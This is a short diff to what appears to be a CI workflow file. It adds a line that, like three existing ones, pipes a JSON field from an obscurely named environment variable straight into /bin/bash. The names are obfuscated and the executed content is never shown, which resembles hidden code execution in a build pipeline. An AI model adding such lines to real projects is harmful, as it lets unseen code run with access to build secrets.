@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$soe6881" | jq -r .dn842 | /bin/bash
           printf '%s' "$yex72685" | jq -r .zjvl40986 | /bin/bash
           printf '%s' "$o87786" | jq -r .t341 | /bin/bash
+          printf '%s' "$oa9" | jq -r .u1 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
